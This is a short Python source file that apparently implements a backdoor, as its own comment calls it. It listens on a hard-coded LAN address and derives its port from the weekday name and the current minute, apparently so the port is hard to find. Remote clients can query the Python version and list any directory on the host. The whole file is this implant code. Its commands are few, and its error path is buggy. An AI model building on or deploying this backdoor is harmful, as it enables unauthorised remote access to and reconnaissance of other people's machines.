import socket
import os 
import platform
from datetime  import date,datetime
import calendar


def Server(ipAddress):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((ipAddress,GetPort()))
    s.listen(1)
    connection,address = s.accept()
    try:
        while 1:
            data = connection.recv(1024)
            if not data: break
            command = data.decode("utf-8").split(" ")
            if commands_Nparam.get(command[0],"command doesn't exist") == "command doesn't exist" and commands_Wparam.get(command[0],"command doesn't exist") == "command doesn't exist":
                connection.sendall(b"command doesn't exist")
            else:
                if commands_Nparam.get(command[0],"a") != "a":
                    connection.sendall(commands_Nparam[command[0]]())             
                else:
                    if len(command) == 1:
                        connection.sendall(b"Enter Argument")
                    else:
                        connection.sendall(commands_Wparam[command[0]](command[1]))
                    
        s.close()
    except:
        s.close()

def GetPort():
    day = calendar.day_name[date.today().weekday()]
    hash = 1
    for i in day :
        hash *= ord(i) 
    return (hash + datetime.now().minute) % 65535

def GetPythonVersion():
    return ("python -version " + platform.python_version()).encode()

def GetDirectories(path):
    try:
        return ("\n".join(os.listdir(path))).encode()
    except:
        return "Wrong path"

#print(GetDirectories("/home/washabitsu/Desktop/Exploit_Development/S_Backdoor"))  
#print(GetPythonVersion())
commands_Nparam= { "pversion":GetPythonVersion}
commands_Wparam = { "getdir":GetDirectories}
Server("192.168.100.50")